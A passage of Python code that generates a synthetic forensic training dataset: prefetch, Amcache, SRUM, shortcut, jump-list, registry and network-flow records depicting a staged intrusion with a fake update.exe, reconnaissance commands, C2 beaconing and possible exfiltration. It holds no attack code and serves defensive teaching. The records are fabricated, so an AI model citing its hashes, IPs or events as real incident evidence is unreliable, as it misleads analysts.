    add("IPCONFIG.EXE-22341A8B.pf", "IPCONFIG.EXE", "22341A8B", 4,
        "2024-11-14 14:21:48", "2024-10-04 14:21:00",
        "2024-09-22 11:14:00", "", 8)
    add("NLTEST.EXE-3142A4B5.pf", "NLTEST.EXE", "3142A4B5", 1,
        "2024-11-14 14:21:55", "", "", "", 12)
    add("NET.EXE-89AB3214.pf", "NET.EXE", "89AB3214", 6,
        "2024-11-14 14:33:19", "2024-11-14 14:22:14",
        "2024-11-08 09:14:11", "2024-10-22 14:18:00", 18)
    add("NET1.EXE-3214A8B9.pf", "NET1.EXE", "3214A8B9", 6,
        "2024-11-14 14:33:42", "2024-11-14 14:22:14.5000000",
        "2024-11-08 09:14:11.5000000", "", 18)
    add("ARP.EXE-4218B3C2.pf", "ARP.EXE", "4218B3C2", 1,
        "2024-11-14 14:22:42", "", "", "", 8)
    add("WHOAMI.EXE-A1142B83.pf", "WHOAMI.EXE", "A1142B83", 2,
        "2024-11-14 14:19:38.5000000", "2024-09-19 14:11:18", "", "", 8)
    add("SVCHOST.EXE-12C8B921.pf", "SVCHOST.EXE", "12C8B921", 42,
        "2024-11-14 03:00:11", "2024-11-13 22:00:00",
        "2024-11-13 03:00:11", "", 184)
    add("EXPLORER.EXE-3142A4B6.pf", "EXPLORER.EXE", "3142A4B6", 184,
        "2024-11-14 08:43:42", "2024-11-13 08:42:00",
        "2024-11-12 08:42:00", "", 512)
    add("WINLOGON.EXE-A8B9421C.pf", "WINLOGON.EXE", "A8B9421C", 21,
        "2024-11-14 02:14:14", "2024-11-13 22:00:14",
        "2024-11-13 02:14:00", "", 84)
    add("USERINIT.EXE-A8B95612.pf", "USERINIT.EXE", "A8B95612", 21,
        "2024-11-14 08:43:42", "2024-11-13 08:42:00",
        "2024-11-12 08:42:00", "", 42)
    add("TASKHOSTW.EXE-7B2A4181.pf", "TASKHOSTW.EXE", "7B2A4181", 84,
        "2024-11-14 14:00:00", "2024-11-14 13:00:00",
        "2024-11-14 12:00:00", "", 32)
    add("CONHOST.EXE-9B23C144.pf", "CONHOST.EXE", "9B23C144", 42,
        "2024-11-14 14:19:42", "2024-11-14 14:33:19",
        "2024-11-14 09:32:00", "", 16)
    add("MSEDGE.EXE-3142A4B7.pf", "MSEDGE.EXE", "3142A4B7", 124,
        "2024-11-14 12:32:04", "2024-11-14 11:00:00",
        "2024-11-14 09:42:00", "", 84)
    return rows


def generate_amcache(rng: random.Random) -> List[Dict[str, str]]:
    """Amcache: first-seen indicators, including update.exe."""
    rows: List[Dict[str, str]] = []

    def add(path, ext, size, sha1, sha256, ver, prod, pub,
            created, modified, compiled):
        rows.append({
            "FullPath": path, "FileExtension": ext, "FileSize": str(size),
            "Sha1": sha1, "Sha256": sha256, "FileVersion": ver,
            "ProductName": prod, "Publisher": pub,
            "Created": ts(created), "LastModified": ts(modified),
            "Compiled": ts(compiled), "IsPeFile": "True",
            "BinaryType": "pe64bit",
        })

    win = "Microsoft Windows"
    msft = "Microsoft Corporation"
    add(f"C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe", ".exe",
        174080,
        "a1b2c3d4e5f6789012345678901234567890abcd",
        "4f8b2c1a8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345",
        "1.0.0.0", "Update", msft,
        "2024-11-14 14:20:11", "2024-11-14 14:20:11.0500000",
        "2024-11-12 03:14:00")
    add("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ".exe", 452608,
        "a89b4218421842184218421842184218421842c1",
        "8b2c1a4f8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345",
        "5.1.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\cmd.exe", ".exe", 289792,
        "c1b3a4218421842184218421842184218421842b",
        "2c1a4f8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
        ".exe", 38422144,
        "d2b4a4218421842184218421842184218421842c",
        "1a4f8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678a",
        "16.0.18025.20030", "Microsoft Office", msft,
        "2024-09-19 14:11:09", "2024-11-14 11:00:00",
        "2024-11-08 03:14:00")
    add("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        ".exe", 4218214,
        "e3b5a4218421842184218421842184218421842d",
        "4f8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678a4f",
        "16.0.18025.20030", "Microsoft Office", msft,
        "2024-09-19 14:11:09", "2024-11-14 11:00:00",
        "2024-11-08 03:14:00")
    add("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
        ".exe", 3842184,
        "f4c6a4218421842184218421842184218421842e",
        "8b3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678a4f8b",
        "16.0.18025.20030", "Microsoft Office", msft,
        "2024-09-19 14:11:09", "2024-11-14 11:00:00",
        "2024-11-08 03:14:00")
    add("C:\\Windows\\Explorer.EXE", ".exe", 4818421,
        "a5d7b4218421842184218421842184218421842f",
        "3d4e5f67890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\NOTEPAD.EXE", ".exe", 184320,
        "b6e8a4218421842184218421842184218421842a",
        "4e5f67890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\ipconfig.exe", ".exe", 42184,
        "c7f9a4218421842184218421842184218421842b",
        "5f67890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\nltest.exe", ".exe", 84218,
        "d8a04218421842184218421842184218421842c1",
        "67890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f67",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\net.exe", ".exe", 42184,
        "e9b14218421842184218421842184218421842d2",
        "7890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f678",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\arp.exe", ".exe", 21092,
        "fac24218421842184218421842184218421842e3",
        "890abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f6789",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Windows\\System32\\whoami.exe", ".exe", 68192,
        "abd34218421842184218421842184218421842f4",
        "90abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f67890",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")
    add("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\msedgewebview2.exe",
        ".exe", 3842184,
        "bce44218421842184218421842184218421842a5",
        "0abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f678901",
        "118.0.2088.76", "Microsoft Edge WebView2", msft,
        "2024-10-04 11:14:00", "2024-11-14 12:32:04",
        "2024-09-22 03:14:00")
    add("C:\\Windows\\System32\\svchost.exe", ".exe", 82048,
        "cdf54218421842184218421842184218421842b6",
        "abcdef1234567890abcdef1234567890abcdef12345678a4f8b3d4e5f6789012",
        "10.0.19041.5247", win, msft,
        "2024-09-12 09:21:14.5000000", "2024-09-12 09:21:14.5000000",
        "2024-08-22 11:14:00")

    return rows


def generate_srum(rng: random.Random) -> List[Dict[str, str]]:
    """SRUM hourly rollups: bytes per app per user per hour."""
    luid = "1689399632855040"
    rows: List[Dict[str, str]] = []

    def add(t, app, sid, sent, recv):
        rows.append({
            "Timestamp": ts(t), "ApplicationName": app, "UserSID": sid,
            "InterfaceLuid": luid,
            "BytesSent": str(sent), "BytesReceived": str(recv),
            "EventTimestamp": ts(t),
        })

    add("2024-11-14 14:00:00", "outlook.exe", USER_SID, 184221, 4218421)
    add("2024-11-14 14:00:00", "msedgewebview2.exe", USER_SID, 42184, 1842184)
    add("2024-11-14 14:00:00", "svchost.exe", "S-1-5-18", 21841, 184221)
    add("2024-11-14 14:30:00", "outlook.exe", USER_SID, 84221, 2184221)
    add("2024-11-14 14:30:00", "powershell.exe", USER_SID, 128421, 1842184)
    add("2024-11-14 14:30:00", "update.exe", USER_SID, 184221, 2415891)
    add("2024-11-14 14:30:00", "msedgewebview2.exe", USER_SID, 21841, 842184)
    add("2024-11-14 14:30:00", "svchost.exe", "S-1-5-18", 11421, 84221)
    add("2024-11-14 14:30:00", "winword.exe", USER_SID, 1142, 21841)
    add("2024-11-14 13:00:00", "outlook.exe", USER_SID, 124221, 1842184)
    add("2024-11-14 13:00:00", "msedgewebview2.exe", USER_SID, 84221, 4218421)
    add("2024-11-14 13:00:00", "winword.exe", USER_SID, 11421, 184221)
    add("2024-11-14 12:00:00", "outlook.exe", USER_SID, 84221, 1842184)
    add("2024-11-14 12:00:00", "excel.exe", USER_SID, 11421, 84221)
    add("2024-11-14 09:00:00", "outlook.exe", USER_SID, 184221, 2184221)
    add("2024-11-14 09:00:00", "excel.exe", USER_SID, 1142, 21841)
    add("2024-11-14 09:00:00", "svchost.exe", "S-1-5-18", 8421, 42184)
    add("2024-11-13 14:00:00", "outlook.exe", USER_SID, 184221, 1842184)
    add("2024-11-13 14:00:00", "msedgewebview2.exe", USER_SID, 42184, 842184)
    add("2024-11-13 13:00:00", "winword.exe", USER_SID, 1142, 21841)

    return rows


def generate_lnk_files(rng: random.Random) -> List[Dict[str, str]]:
    """Recent LNK files from %APPDATA%\\Microsoft\\Windows\\Recent."""
    rows: List[Dict[str, str]] = []

    def add(source, sc, sm, sa, tc, tm, ta, sz, rel, wd, lp):
        rows.append({
            "SourceFile": source, "SourceCreated": ts(sc),
            "SourceModified": ts(sm), "SourceAccessed": ts(sa),
            "TargetCreated": ts(tc), "TargetModified": ts(tm),
            "TargetAccessed": ts(ta), "FileSize": str(sz),
            "RelativePath": rel, "WorkingDirectory": wd, "LocalPath": lp,
            "VolumeSerialNumber": VOL_SERIAL, "VolumeLabel": "SYSTEM",
            "DriveType": "FixedHardDisk", "MachineId": HOSTNAME.lower(),
        })

    base_recent = (f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\"
                   "Windows\\Recent")
    docs = f"C:\\Users\\{USER}\\Documents"
    desk = f"C:\\Users\\{USER}\\Desktop"
    downs = f"C:\\Users\\{USER}\\Downloads"

    add(f"{base_recent}\\Q4_Payroll_Review.lnk",
        "2024-11-14 14:18:55.5000000", "2024-11-14 14:18:55.5000000",
        "2024-11-14 14:18:55.5000000",
        "2024-11-12 09:32:14", "2024-11-14 11:14:22",
        "2024-11-14 14:18:55", 1247568,
        "..\\..\\..\\..\\..\\..\\Documents\\Q4_Payroll_Review.xlsm",
        docs, f"{docs}\\Q4_Payroll_Review.xlsm")
    add(f"{base_recent}\\Q3_Payroll_Final.lnk",
        "2024-08-22 17:14:08", "2024-11-08 10:05:33",
        "2024-11-08 10:05:33",
        "2024-08-22 16:42:11", "2024-08-22 17:14:08",
        "2024-11-08 10:05:33", 892471,
        "..\\..\\..\\..\\..\\..\\Documents\\Q3_Payroll_Final.xlsx",
        docs, f"{docs}\\Q3_Payroll_Final.xlsx")
    add(f"{base_recent}\\Vendor_Notes.lnk",
        "2024-10-04 14:22:30", "2024-11-13 09:14:00",
        "2024-11-13 09:14:00",
        "2024-10-04 14:22:18", "2024-10-04 14:22:18",
        "2024-11-13 09:14:00", 42891,
        "..\\..\\..\\..\\..\\..\\Documents\\Vendor_Notes.docx",
        docs, f"{docs}\\Vendor_Notes.docx")
    add(f"{base_recent}\\Pay_Schedule_Q4.lnk",
        "2024-10-15 11:08:30", "2024-11-13 13:14:33",
        "2024-11-13 13:14:33",
        "2024-10-15 11:08:00", "2024-11-04 09:30:42",
        "2024-11-13 13:14:33", 184221,
        "..\\..\\..\\..\\..\\..\\Documents\\Pay_Schedule_Q4.xlsx",
        docs, f"{docs}\\Pay_Schedule_Q4.xlsx")
    add(f"{base_recent}\\Notes.lnk",
        "2024-11-08 13:42:00", "2024-11-13 13:42:00",
        "2024-11-13 13:42:00",
        "2024-11-08 13:42:00", "2024-11-13 13:42:00",
        "2024-11-13 13:42:00", 2184,
        "..\\..\\..\\..\\..\\..\\Desktop\\Notes.txt",
        desk, f"{desk}\\Notes.txt")
    add(f"{base_recent}\\benefits_2025.lnk",
        "2024-11-08 10:42:00", "2024-11-08 14:18:00",
        "2024-11-08 14:18:00",
        "2024-11-08 10:42:00", "2024-11-08 10:42:00",
        "2024-11-08 14:18:00", 1248421,
        "..\\..\\..\\..\\..\\..\\Downloads\\benefits_2025.pdf",
        downs, f"{downs}\\benefits_2025.pdf")
    add(f"{base_recent}\\timesheet_template.lnk",
        "2024-10-22 13:18:00", "2024-10-22 13:30:00",
        "2024-10-22 13:30:00",
        "2024-10-22 13:18:00", "2024-10-22 13:18:00",
        "2024-10-22 13:30:00", 38712,
        "..\\..\\..\\..\\..\\..\\Downloads\\timesheet_template.xlsx",
        downs, f"{downs}\\timesheet_template.xlsx")
    add(f"{base_recent}\\Tax_Forms_2024.lnk",
        "2024-09-04 14:11:00", "2024-11-04 09:30:00",
        "2024-11-04 09:30:00",
        "2024-09-04 14:11:00", "2024-09-04 14:22:00",
        "2024-11-04 09:30:00", 28471,
        "..\\..\\..\\..\\..\\..\\Documents\\Tax_Forms_2024.docx",
        docs, f"{docs}\\Tax_Forms_2024.docx")
    add(f"{base_recent}\\Onboarding_Checklist.lnk",
        "2024-09-19 14:42:00", "2024-09-19 14:42:00",
        "2024-09-19 14:42:00",
        "2024-09-19 14:42:00", "2024-09-19 14:42:00",
        "2024-09-19 14:42:00", 18421,
        "..\\..\\..\\..\\..\\..\\Documents\\Onboarding_Checklist.xlsx",
        docs, f"{docs}\\Onboarding_Checklist.xlsx")
    add(f"{base_recent}\\Quarterly_Tasks.lnk",
        "2024-10-01 09:14:00", "2024-11-13 09:00:00",
        "2024-11-13 09:00:00",
        "2024-10-01 09:14:00", "2024-11-04 09:30:00",
        "2024-11-13 09:00:00", 21455,
        "..\\..\\..\\..\\..\\..\\Desktop\\Quarterly_Tasks.xlsx",
        desk, f"{desk}\\Quarterly_Tasks.xlsx")
    return rows


def generate_jump_lists(rng: random.Random) -> List[Dict[str, str]]:
    """Jump list AutomaticDestinations rows."""
    rows: List[Dict[str, str]] = []

    def add(appid, app_desc, n, lm, ct, tc, tm, lp, sz):
        rows.append({
            "SourceFile": f"{appid}.automaticDestinations-ms",
            "AppId": appid, "AppDescription": app_desc,
            "EntryNumber": str(n),
            "LastModified": ts(lm) if lm else "",
            "CreationTime": ts(ct) if ct else "",
            "TargetCreated": ts(tc) if tc else "",
            "TargetModified": ts(tm) if tm else "",
            "LocalPath": lp, "Hostname": HOSTNAME.lower(),
            "VolumeSerialNumber": VOL_SERIAL,
            "FileSize": str(sz) if sz else "",
        })

    docs = f"C:\\Users\\{USER}\\Documents"
    desk = f"C:\\Users\\{USER}\\Desktop"
    excel = "12dc1ea8e34b6a0b"
    word = "9b9cdc69c1c24e2b"
    outlook = "00fe1d4e09f74f7d"
    notepad = "918e0ecb43d17e23"
    explorer = "1b4dd67f29cb1962"
    edge = "ad62c5ad4ac45c97"

    add(excel, "Microsoft Excel", 1,
        "2024-11-14 14:18:55", "2024-11-14 14:18:55",
        "2024-11-12 09:32:14", "2024-11-14 11:14:22",
        f"{docs}\\Q4_Payroll_Review.xlsm", 1247568)
    add(excel, "Microsoft Excel", 2,
        "2024-11-13 13:14:33", "2024-10-15 11:08:30",
        "2024-10-15 11:08:00", "2024-11-04 09:30:42",
        f"{docs}\\Pay_Schedule_Q4.xlsx", 184221)
    add(excel, "Microsoft Excel", 3,
        "2024-11-13 09:00:00", "2024-10-01 09:14:00",
        "2024-10-01 09:14:00", "2024-11-04 09:30:00",
        f"{desk}\\Quarterly_Tasks.xlsx", 21455)
    add(excel, "Microsoft Excel", 4,
        "2024-11-08 10:05:33", "2024-08-22 17:14:08",
        "2024-08-22 16:42:11", "2024-08-22 17:14:08",
        f"{docs}\\Q3_Payroll_Final.xlsx", 892471)
    add(word, "Microsoft Word", 1,
        "2024-11-13 09:14:00", "2024-10-04 14:22:30",
        "2024-10-04 14:22:18", "2024-10-04 14:22:18",
        f"{docs}\\Vendor_Notes.docx", 42891)
    add(word, "Microsoft Word", 2,
        "2024-11-04 09:30:00", "2024-09-04 14:11:00",
        "2024-09-04 14:11:00", "2024-09-04 14:22:00",
        f"{docs}\\Tax_Forms_2024.docx", 28471)
    add(outlook, "Microsoft Outlook", 1,
        "2024-11-14 14:19:38", "2024-11-14 08:48:14",
        None, None, "", None)
    add(notepad, "Notepad", 1,
        "2024-11-13 13:42:00", "2024-11-08 13:42:00",
        "2024-11-08 13:42:00", "2024-11-13 13:42:00",
        f"{desk}\\Notes.txt", 2184)
    add(explorer, "File Explorer", 1,
        "2024-11-14 13:42:11", "2024-11-14 13:42:11",
        None, None, "", None)
    add(explorer, "File Explorer", 2,
        "2024-11-08 14:18:00", "2024-11-08 14:18:00",
        None, None, "", None)
    add(edge, "Microsoft Edge", 1,
        "2024-11-14 12:32:04", "2024-11-14 11:00:00",
        None, None, "", None)
    return rows


def _normalize_key_lastwrite(rows):
    """Force one LastWriteTime per registry key.

    In a real hive, LastWriteTime is a property of the KEY, not of the
    individual values under it — there is no per-value timestamp. A parser
    reporting different LastWriteTime values for two values in the same key
    is reporting something the registry cannot express.

    The correct value for every row under a key is the key's most recent
    write. Collapsing to the max here means the dataset teaches the same
    lesson the book does (Ch5 §5.1.2, Ch10 §10.5): a recent LastWriteTime
    tells you *something* under the key changed, not *which* value.
    """
    latest = {}
    for r in rows:
        lwt = (r.get("LastWriteTime") or "").strip()
        if not lwt:
            continue
        k = (r.get("Hive", ""), r.get("KeyPath", ""))
        if lwt > latest.get(k, ""):
            latest[k] = lwt
    for r in rows:
        if (r.get("LastWriteTime") or "").strip():
            r["LastWriteTime"] = latest[(r.get("Hive", ""), r.get("KeyPath", ""))]
    return rows


def generate_registry_runkeys(rng: random.Random) -> List[Dict[str, str]]:
    """Run keys: all benign — there is no Run-key persistence in this story."""
    rows: List[Dict[str, str]] = []

    def add(hive, key, vname, vdata, vtype, lwt, notes):
        rows.append({
            "Hive": hive, "KeyPath": key, "ValueName": vname,
            "ValueData": vdata, "ValueType": vtype,
            "LastWriteTime": ts(lwt) if lwt else "", "Notes": notes,
        })

    add("SOFTWARE", "Microsoft\\Windows\\CurrentVersion\\Run",
        "SecurityHealth",
        "%windir%\\system32\\SecurityHealthSystray.exe",
        "RegExpandSz", "2024-09-12 09:21:14.5000000",
        "Built-in Defender tray")
    add("SOFTWARE", "Microsoft\\Windows\\CurrentVersion\\Run",
        "RTKAUDUService",
        "C:\\Program Files\\Realtek\\Audio\\HDA\\RtkAudUService64.exe -s",
        "RegSz", "2024-09-12 09:21:14.5000000", "Realtek audio")
    add("SOFTWARE", "Microsoft\\Windows\\CurrentVersion\\Run", "OneDrive",
        f'"C:\\Users\\{USER}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
        "RegSz", "2024-09-19 14:12:00",
        "User-installed OneDrive (per-machine entry)")
    add("SOFTWARE", "Microsoft\\Windows\\CurrentVersion\\Run",
        "MicrosoftTeams",
        '"C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe" '
        '--processStart Teams.exe',
        "RegSz", "2024-09-22 11:14:00", "Teams autostart")
    add("SOFTWARE", "Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "DELETE_NULL_KEY", "", "RegSz",
        "2024-09-12 09:21:14.5000000", "Empty default")
    add("SOFTWARE",
        "Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
        "", "", "", "", "No values present")
    add("SOFTWARE", "WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "", "", "", "", "No 32-bit Run entries")
    add("NTUSER.DAT", "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "OneDrive",
        f'"C:\\Users\\{USER}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
        "RegSz", "2024-09-19 14:12:00",
        "Per-user OneDrive autostart")
    add("NTUSER.DAT", "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "com.squirrel.Teams.Teams",
        f'"C:\\Users\\{USER}\\AppData\\Local\\Microsoft\\Teams\\Update.exe" '
        '--processStart "Teams.exe"',
        "RegSz", "2024-09-22 11:14:00", "Teams Squirrel updater")
    add("NTUSER.DAT",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "", "", "", "", "No values present")
    add("NTUSER.DAT",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
        "Startup",
        f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        "RegSz", "2024-09-19 14:11:09", "Default startup folder path")
    add("SOFTWARE",
        "Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit",
        "C:\\Windows\\system32\\userinit.exe,", "RegSz",
        "2024-09-12 09:21:14.5000000", "Default Userinit")
    add("SOFTWARE",
        "Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell",
        "explorer.exe", "RegSz", "2024-09-12 09:21:14.5000000",
        "Default Shell")
    rows = _normalize_key_lastwrite(rows)
    return rows


def generate_registry_services(rng: random.Random) -> List[Dict[str, str]]:
    """Services hive: legitimate services plus the recently installed npcap."""
    rows: List[Dict[str, str]] = []

    def add(name, disp, path, start, kind, lwt, desc):
        rows.append({
            "ServiceName": name, "DisplayName": disp, "ImagePath": path,
            "StartType": start, "Type": kind,
            "LastWriteTime": ts(lwt), "Description": desc,
        })

    add("W32Time", "Windows Time",
        "C:\\Windows\\system32\\svchost.exe -k LocalService -p",
        "Manual", "Win32_OwnProcess", "2024-09-12 09:21:14.5000000",
        "Maintains date and time synchronization")
    add("WinDefend", "Microsoft Defender Antivirus Service",
        '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2410.0-0\\MsMpEng.exe"',
        "Automatic", "Win32_OwnProcess", "2024-11-14 03:02:11",
        "Helps protect users from malware")
    add("ClickToRunSvc", "Microsoft Office Click-to-Run Service",
        '"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe"',
        "Automatic", "Win32_OwnProcess", "2024-09-19 14:11:09",
        "Office Click-to-Run")
    add("Spooler", "Print Spooler",
        "C:\\Windows\\System32\\spoolsv.exe",
        "Automatic", "Win32_OwnProcess", "2024-09-12 09:21:14.5000000",
        "Manages print jobs")
    add("WSearch", "Windows Search",
        '"C:\\Windows\\system32\\SearchIndexer.exe" /Embedding',
        "Automatic_Delayed", "Win32_OwnProcess",
        "2024-09-12 09:21:14.5000000", "Provides content indexing")
    add("BITS", "Background Intelligent Transfer Service",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
        "Manual", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Transfers files in the background")
    add("wuauserv", "Windows Update",
        "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
        "Manual", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Enables detection download install of updates")
    add("LanmanServer", "Server",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Supports file print and named-pipe sharing")
    add("LanmanWorkstation", "Workstation",
        "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Creates and maintains client network connections")
    add("Dnscache", "DNS Client",
        "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Caches DNS names and registers")
    add("EventLog", "Windows Event Log",
        "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Manages events and event logs")
    add("RpcSs", "Remote Procedure Call",
        "C:\\Windows\\system32\\svchost.exe -k rpcss -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "RPC subsystem")
    add("TermService", "Remote Desktop Services",
        "C:\\Windows\\System32\\svchost.exe -k NetworkService",
        "Manual", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Allows users to connect interactively")
    add("UserManager", "User Manager",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
        "Automatic", "Win32_ShareProcess", "2024-09-12 09:21:14.5000000",
        "Provides applications with access to user state")
    add("mpsdrv", "Windows Firewall Authorization Driver",
        "C:\\Windows\\System32\\drivers\\mpsdrv.sys",
        "Manual", "Kernel", "2024-09-12 09:21:14.5000000",
        "Windows Firewall driver")
    add("edgeupdate", "Microsoft Edge Update Service",
        '"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /svc',
        "Automatic_Delayed", "Win32_OwnProcess",
        "2024-09-22 11:14:00", "Keeps Edge up to date")
    add("edgeupdatem", "Microsoft Edge Update Service (m)",
        '"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /medsvc',
        "Manual", "Win32_OwnProcess",
        "2024-09-22 11:14:00", "Edge update worker service")
    add("SgrmBroker", "System Guard Runtime Monitor Broker",
        '"C:\\Windows\\system32\\SgrmBroker.exe"',
        "Automatic", "Win32_OwnProcess", "2024-09-12 09:21:14.5000000",
        "System integrity monitoring")
    add("SecurityHealthService", "Windows Security Service",
        "C:\\Windows\\system32\\SecurityHealthService.exe",
        "Manual", "Win32_OwnProcess", "2024-09-12 09:21:14.5000000",
        "Handles all unified security service notifications")
    add("npcap", "Npcap Packet Driver",
        "\\??\\C:\\Windows\\System32\\drivers\\npcap.sys",
        "Demand", "KernelDriver", "2024-11-14 02:14:18",
        "User-installed packet capture driver — recently installed")
    return rows


def generate_network_flow(rng: random.Random) -> List[Dict[str, str]]:
    """Network flow records: C2 to 91.214.47.22 + lateral SMB."""
    rows: List[Dict[str, str]] = []

    def add(fs, fe, sip, sp, dip, dp, proto, bs, br, ps, pr, owner, note):
        rows.append({
            "FlowStart": fs, "FlowEnd": fe, "SourceIP": sip,
            "SourcePort": str(sp), "DestIP": dip, "DestPort": str(dp),
            "Protocol": proto, "BytesSent": str(bs), "BytesReceived": str(br),
            "PacketsSent": str(ps), "PacketsReceived": str(pr),
            "OwningProcess": owner, "Notes": note,
        })

    add("2024-11-14 14:00:00", "2024-11-14 14:00:48", WKSTN_IP, 49214,
        "52.96.128.45", 443, "TCP", 4218, 184221, 12, 184,
        "outlook.exe", "Exchange Online (legitimate)")
    add("2024-11-14 14:00:11", "2024-11-14 14:01:32", WKSTN_IP, 49215,
        "40.126.32.74", 443, "TCP", 8421, 128421, 18, 142,
        "outlook.exe", "Microsoft Graph")
    add("2024-11-14 14:01:14", "2024-11-14 14:01:18", WKSTN_IP, 49216,
        "8.8.8.8", 53, "UDP", 84, 184, 1, 1, "svchost.exe", "DNS query")
    add("2024-11-14 14:18:55", "2024-11-14 14:19:05", WKSTN_IP, 49217,
        "52.96.128.45", 443, "TCP", 2184, 18421, 8, 21,
        "outlook.exe", "Exchange Online — keepalive")
    add("2024-11-14 14:19:42", "2024-11-14 14:19:48", WKSTN_IP, 52914,
        C2_IP, 443, "TCP", 1847, 184221, 12, 142,
        "powershell.exe", "Suspicious — first observation of this IP")
    add("2024-11-14 14:21:48", "2024-11-14 14:22:14", WKSTN_IP, 52915,
        C2_IP, 443, "TCP", 4218, 18421, 18, 42,
        "update.exe", "Beacon — small bidirectional traffic")
    add("2024-11-14 14:21:55", "2024-11-14 14:22:44", WKSTN_IP, 52916,
        C2_IP, 443, "TCP", 184221, 2415891, 142, 1842,
        "update.exe", "Large outbound transfer — possible exfil")
    add("2024-11-14 14:22:00", "2024-11-14 14:22:00", WKSTN_IP, 49218,
        INTERNAL_DNS, 53, "UDP", 84, 184, 1, 1,
        "svchost.exe", "Internal DNS — adversary host check")
    add("2024-11-14 14:22:14", "2024-11-14 14:22:48", WKSTN_IP, 52917,
        C2_IP, 443, "TCP", 18421, 42184, 42, 84,
        "update.exe", "Continued beacon")
    add("2024-11-14 14:22:42", "2024-11-14 14:22:42", WKSTN_IP, 49219,
        "224.0.0.1", 5355, "UDP", 84, 0, 1, 0,
        "svchost.exe", "LLMNR multicast")
    add("2024-11-14 14:31:05", "2024-11-14 14:33:14",
        ADVERSARY_INBOUND_IP, 49220, WKSTN_IP, 445, "TCP",
        11421, 4218421, 42, 1842, "System",
        "SMB inbound from 10.0.4.17 — adversary-controlled pivot host (NOT FILESVR-03)")
    add("2024-11-14 14:33:18", "2024-11-14 14:33:42", WKSTN_IP, 49221,
